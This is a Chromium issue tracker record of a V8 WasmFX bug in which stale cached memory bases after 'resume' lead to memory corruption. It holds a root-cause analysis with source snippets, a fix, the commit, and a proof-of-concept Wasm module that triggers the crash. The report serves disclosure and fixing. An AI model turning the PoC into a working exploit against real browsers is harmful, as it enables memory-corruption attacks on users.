# # WasmFX Resume Stale Memory Cache Lead To Memory Curruption

| Field | Value |
|-------|-------|
| **Issue ID** | [488089242](https://issues.chromium.org/issues/488089242) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>WebAssembly |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Chrome Version** | 145.0.0.0 |
| **Reporter** | pw...@gmail.com |
| **Assignee** | th...@chromium.org |
| **Created** | 2026-02-27 |
| **Bounty** | Confirmed (amount unknown) |

## Description

# Steps to reproduce the problem

out.gn/out/asan/d8   

--experimental-wasm-wasmfx   

--no-liftoff   

--wasm-enforce-bounds-checks   

--stress-wasm-memory-moving   

--no-wasm-trap-handler   

wasmfx\_resume\_stale\_memcache\_p0\_poc.js

# Problem Description

# WasmFX Resume Stale Memory Cache RCA Report (With V8 Source Snippets)

## 1 Overview

The crash is caused by missing `InstanceCache` reloads on `Resume*` success paths. After `memory.grow`, updated memory base/size exist in instance data, but Turboshaft may still use stale cached `memory0_start` for post-resume memory operations.

## 3 RCA Analysis

### 4 Evidence A: Cache Model and Memory Access Depend on `InstanceCache`

Source: `src/wasm/turboshaft-graph-interface.cc`

```
const WasmMemory& mem = mod->memories[0];
memory_can_grow_ = mem.initial_pages != mem.maximum_pages;
memory_size_cached_ = !mem.is_shared || !memory_can_grow_;
memory_can_move_ = mem.bounds_checks != kTrapHandler &&
                   memory_can_grow_ && !mem.is_shared;
void ReloadCachedMemory() {
  if (memory_can_move()) mem_start_ = LoadMemStart();
  if (memory_can_grow_ && memory_size_cached_) mem_size_ = LoadMemSize();
}

V<WordPtr> memory0_start() { return mem_start_; }
V<WordPtr> memory0_size() {
  if (!memory_size_cached_) return LoadMemSize();
  return mem_size_;
}

```
```
V<WordPtr> MemStart(uint32_t index) {
  if (index == 0) {
    return instance_cache_.memory0_start();
  } else {
    V<TrustedFixedAddressArray> instance_memories =
        LOAD_IMMUTABLE_PROTECTED_INSTANCE_FIELD(trusted_instance_data(false),
                                                MemoryBasesAndSizes,
                                                TrustedFixedAddressArray);
    return __ Load(instance_memories, LoadOp::Kind::TaggedBase(),
                   MemoryRepresentation::UintPtr(),
                   TrustedFixedAddressArray::OffsetOfElementAt(2 * index));
  }
}

V<WordPtr> MemSize(uint32_t index) {
  if (index == 0) {
    return instance_cache_.memory0_size();
  } else {
    V<TrustedByteArray> instance_memories =
        LOAD_IMMUTABLE_PROTECTED_INSTANCE_FIELD(trusted_instance_data(false),
                                                MemoryBasesAndSizes,
                                                TrustedByteArray);
    return __ Load(
        instance_memories, LoadOp::Kind::TaggedBase().NotLoadEliminable(),
        MemoryRepresentation::UintPtr(),
        TrustedFixedAddressArray::OffsetOfElementAt(2 * index + 1));
  }
}

```

Meaning: memory index 0 operations are directly fed by cached base/size.

### 7 Causal Chain

1. `Resume*` performs side-effecting builtin call (`HandleEffects::kYes`).
2. Continuation executes `memory.grow` and updates instance memory fields.
3. Resume success path does not call `ReloadCachedMemory()`.
4. Post-resume memory operation uses stale cached base.
5. Under moving grow conditions, stale base dereference causes `SEGV_ACCERR`.

## 8 Fix Recommendations

1. Add `instance_cache_.ReloadCachedMemory()` immediately after success-path calls in:
   - `Resume`
   - `ResumeThrow`
   - `ResumeThrowRef`
2. Add regression: `resume -> memory.grow -> post-resume store/load`.
3. Test with `--no-wasm-trap-handler` + `--stress-wasm-memory-moving`.

Recommended pattern:

```
V<WordPtr> result_buffer =
    CallBuiltinThroughJumptable<BuiltinCallDescriptor::WasmFXResume,
                                HandleEffects::kYes>(
        decoder, {stack, arg_buffer}, CheckForException::kCatchInThisFrame);
instance_cache_.ReloadCachedMemory();
UnpackResumeReturns(sig, returns, result_buffer);

```
## 9 PoC

```
out.gn/out/asan/d8 \
  --experimental-wasm-wasmfx \
  --no-liftoff \
  --wasm-enforce-bounds-checks \
  --stress-wasm-memory-moving \
  --no-wasm-trap-handler \
  wasmfx_resume_stale_memcache_p0_poc.js

```

POC

```
load('test/mjsunit/wasm/wasm-module-builder.js');

const builder = new WasmModuleBuilder();
const mem = builder.addMemory(1, 220, false);
builder.exportMemoryAs('mem', mem);

const sig_v_v = builder.addType(kSig_v_v);
const cont_index = builder.addCont(sig_v_v);

const grower = builder.addFunction('grower', sig_v_v)
    .addBody([
      kExprI32Const, 1,
      kExprMemoryGrow, mem,
      kExprDrop,
    ]);

builder.addDeclarativeElementSegment([grower.index]);

builder.addFunction('main', kSig_i_v)
    .addBody([
      // resume -> continuation runs memory.grow
      kExprRefFunc, grower.index,
      kExprContNew, cont_index,
      kExprResume, cont_index, 0,

      // post-resume memory ops that may use stale cached memory base
      kExprI32Const, 0,
      ...wasmI32Const(123),
      kExprI32StoreMem, 0, 0,
      kExprI32Const, 0,
      kExprI32LoadMem, 0, 0,
    ])
    .exportFunc();

const instance = builder.instantiate();
const ret = instance.exports.main();
print('ret=' + ret + ' bytes=' + instance.exports.mem.buffer.byteLength);

```
# Summary

# WasmFX Resume Stale Memory Cache Lead To Memory Curruption

# Custom Questions

#### Type of crash:

v8

# Additional Data

Category: Security   

Chrome Channel: Not sure   

Regression: N/A \

## Timeline

### pw...@gmail.com (2026-02-27)

Credit : Pwn2addr

### ch...@google.com (2026-02-28)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### ch...@google.com (2026-02-28)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-28)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must exceed severity.

### cl...@appspot.gserviceaccount.com (2026-03-02)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4689274016301056.

### th...@chromium.org (2026-03-02)

Confirming the issue. But since this requires an experimental flag (`--experimental-wasm-wasmfx`), removing the security labels.

### dx...@google.com (2026-03-02)

Project: v8/v8  

Branch:  main  

Author:  Thibaud Michaud [thibaudm@chromium.org](mailto:thibaudm@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7623261>

[wasmfx] Add missing memory cache reload

---


Expand for full commit details
```
     
    The cached memory start and size were only reloaded in the effect 
    handlers of a resume instruction (or one of its variants), but not on 
    the normal return path. 
     
    R=jkummerow@chromium.org 
     
    Fixed: 488089242 
    Change-Id: If4fcbc0f84c6ea9c887d4ae89a4f30f8f1349ec4 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7623261 
    Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
    Reviewed-by: Jakob Kummerow <jkummerow@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105534}

```

---

Files:

- M `src/wasm/turboshaft-graph-interface.cc`
- A `test/mjsunit/regress/wasm/regress-488089242.js`

---

Hash: [8e06a26e1263fd967cb7f1d856761f9d26627681](https://chromiumdash.appspot.com/commit/8e06a26e1263fd967cb7f1d856761f9d26627681)  

Date: Mon Mar 2 15:52:59 2026


---

### cl...@chromium.org (2026-03-09)

Adjusting labels: This fixed a vulnerability, but with no security impact.

### sp...@google.com (2026-03-31)

*NOTE: This is an automatically generated email*

Hello,

Chrome Vulnerability Rewards Program (VRP) Panel has decided that the security impact of this
issue does not meet the criteria to qualify for a reward.

Rationale for this decision:

Out of scope, experimental feature

Note that the fact that this issue is not being rewarded does not mean
that the product team won't fix the issue. We have filed a bug with the product
team and they will review your report and decide if a fix is required. We'll
let you know if the issue was fixed.

Regards,   

Google Security Bot

*How did we do? Please fill out a [short anonymous survey](https://goo.gl/IR3KRH).*

### ch...@google.com (2026-06-09)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> Out of scope, experimental feature
> 
> 
> Note that the fact that this issue is not being rewarded does not mean
> that the product team won't fix the issue. We have filed a bug with the product
> team and they will review your report and decide if a fix is required. We'll
> let you know if the issue was fixed.
> 
> Regards, \
> Google Security Bot
> 
> *How did we do? Please fill out a [short anonymous survey](https://goo.gl/IR3KRH).*

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/488089242)*
